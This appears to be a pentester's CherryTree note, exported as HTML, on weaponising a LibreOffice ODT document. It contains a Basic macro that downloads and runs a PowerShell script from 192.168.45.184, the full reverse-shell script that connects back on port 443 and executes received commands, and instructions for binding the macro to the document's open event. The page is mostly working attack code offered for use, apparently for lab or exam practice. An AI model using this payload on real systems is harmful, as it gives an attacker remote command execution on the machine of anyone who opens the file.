<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Macros_linux_libreoffice_odt</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Macros_linux_libreoffice_odt</h1><br/><p><ul><li>create a odt file and save it </li><li> go to the file</li><li>we click &quot;Tools&quot; and navigate to &quot;Macros&quot; -&gt; &quot;Organize Macros&quot; -&gt; &quot;Basic&quot;.</li><li></li></ul><div class="codebox"><pre>Sub Main<br />    Shell<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&quot;cmd /c powershell iwr http://192.168.45.184/rev.ps1 -o C:/Windows/Tasks/rev.ps1&quot;</span><span style="color:#ff9d00;font-weight:700">)</span><br />    Shell<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&quot;cmd /c powershell -c C:/Windows/Tasks/rev.ps1&quot;</span><span style="color:#ff9d00;font-weight:700">)</span><br />End Sub</pre></div></p><p></p><p><ul><li>rev.ps1</li><li></li></ul><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">$LHOST</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;192.168.45.184&quot;</span>; <span style="color:#0088ff;font-weight:400">$LPORT</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#333333;font-weight:400">443</span>; <span style="color:#0088ff;font-weight:400">$TCPClient</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">New-Object</span> Net.Sockets.TCPClient(<span style="color:#0088ff;font-weight:400">$LHOST</span>, <span style="color:#0088ff;font-weight:400">$LPORT</span>); <span style="color:#0088ff;font-weight:400">$NetworkStream</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#0088ff;font-weight:400">$TCPClient</span>.GetStream(); <span style="color:#0088ff;font-weight:400">$StreamReader</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">New-Object</span> IO.StreamReader(<span style="color:#0088ff;font-weight:400">$NetworkStream</span>); <span style="color:#0088ff;font-weight:400">$StreamWriter</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">New-Object</span> IO.StreamWriter(<span style="color:#0088ff;font-weight:400">$NetworkStream</span>); <span style="color:#0088ff;font-weight:400">$StreamWriter</span>.AutoFlush <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#0088ff;font-weight:400">$true</span>; <span style="color:#0088ff;font-weight:400">$Buffer</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">New-Object</span> System.<span style="color:#7f0044;font-weight:400">Byte</span>[] <span style="color:#333333;font-weight:400">1024</span>; <span style="color:#ff9d00;font-weight:700">while</span> (<span style="color:#0088ff;font-weight:400">$TCPClient</span>.Connected) { <span style="color:#ff9d00;font-weight:700">while</span> (<span style="color:#0088ff;font-weight:400">$NetworkStream</span>.DataAvailable) { <span style="color:#0088ff;font-weight:400">$RawData</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#0088ff;font-weight:400">$NetworkStream</span>.Read(<span style="color:#0088ff;font-weight:400">$Buffer</span>, <span style="color:#333333;font-weight:400">0</span>, <span style="color:#0088ff;font-weight:400">$Buffer</span>.Length); <span style="color:#0088ff;font-weight:400">$Code</span> <span style="color:#ff9d00;font-weight:700">=</span> ([text.encoding]<span style="color:#ff9d00;font-weight:700">::</span>UTF8).GetString(<span style="color:#0088ff;font-weight:400">$Buffer</span>, <span style="color:#333333;font-weight:400">0</span>, <span style="color:#0088ff;font-weight:400">$RawData</span> <span style="color:#ff9d00;font-weight:700">-</span><span style="color:#333333;font-weight:400">1</span>) }; <span style="color:#ff9d00;font-weight:700">if</span> (<span style="color:#0088ff;font-weight:400">$TCPClient</span>.Connected <span style="color:#ff9d00;font-weight:700">-and</span> <span style="color:#0088ff;font-weight:400">$Code</span>.Length <span style="color:#ff9d00;font-weight:700">-gt</span> <span style="color:#333333;font-weight:400">1</span>) { <span style="color:#0088ff;font-weight:400">$Output</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">try</span> { <span style="color:#ff9d00;font-weight:700">Invoke-Expression</span> (<span style="color:#0088ff;font-weight:400">$Code</span>) <span style="color:#333333;font-weight:400">2</span>&gt;&amp;<span style="color:#333333;font-weight:400">1</span> } <span style="color:#ff9d00;font-weight:700">catch</span> { <span style="color:#0088ff;font-weight:400">$_</span> }; <span style="color:#0088ff;font-weight:400">$StreamWriter</span>.<span style="color:#ff9d00;font-weight:700">Write</span>(<span style="color:#3ad900;font-weight:400">&quot;$Output`n&quot;</span>); <span style="color:#0088ff;font-weight:400">$Code</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#0088ff;font-weight:400">$null</span> } }; <span style="color:#0088ff;font-weight:400">$TCPClient</span>.Close(); <span style="color:#0088ff;font-weight:400">$NetworkStream</span>.Close(); <span style="color:#0088ff;font-weight:400">$StreamReader</span>.Close(); <span style="color:#0088ff;font-weight:400">$StreamWriter</span>.Close()</pre></div><ul><li>Next, we will need to create a trigger to execute our code. From the top menu, let&#39;s click on &quot;Tools&quot; and then &quot;Customize...&quot;. In the new window that appears, we click the &quot;Events&quot; tab. Let&#39;s choose &quot;Open Document&quot; from the main panel and click the &quot;Macro...&quot; button on the right side.</li></ul></p></div>
</body>
</html>
